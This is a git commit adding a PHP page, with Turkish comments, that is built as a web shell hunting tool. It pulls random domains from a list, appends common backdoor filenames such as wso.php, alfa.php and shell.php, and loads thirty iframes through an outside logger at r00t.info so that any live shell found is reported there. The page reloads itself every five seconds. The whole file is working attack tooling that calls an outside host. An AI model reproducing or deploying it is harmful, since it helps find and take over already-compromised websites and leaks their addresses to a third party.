233ef631b2e4c60c947e5e558a65189e6c7c92c7
fxbkodyaziyi <42306185+fxbkodyaziyi@users.noreply.github.com>
2018-08-11 23:13:32 +0000

    Add files via upload

---
+++ index.php
@@ -0,0 +1,120 @@
+<meta http-equiv="refresh" content="5">
+
+<?php
+
+ 
+
+
+/** LOGCUNUN LİNKİ BURAYA  **/
+
+$logcununlinki ="http://r00t.info/yaz.php?a=";
+
+
+/**  SENDE PHP EKLEYEBİLİRSİN DOSTUM **/
+
+$uzanti = array('sadrazam.php', 'k2.php', 'shell.php', 'alfa.php', 'wso.php');
+$fxb = $uzanti;
+
+/** UZANTI ÇEKMEYE YARAYAN FONKSİYON **/
+
+function seriuzantigetirkrsm($uzanti, &$fxb){
+    if(count($fxb)==0)
+        $fxb = $uzanti;
+    return array_pop( $fxb );
+}
+
+
+//** ELLEME BURAYA **//
+
+
+function RandomLine() {
+			srand ((double)microtime()*1000000);
+			$f_contents = file("domain.txt");
+			$line = $f_contents[array_rand($f_contents)];
+			print $line;
+		}
+
+
+
+?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+<iframe src="<?php echo $logcununlinki ?>http://<?php  echo RandomLine(); ?>/<?php  echo seriuzantigetirkrsm($uzanti, $fxb); ?>"> </iframe>
+
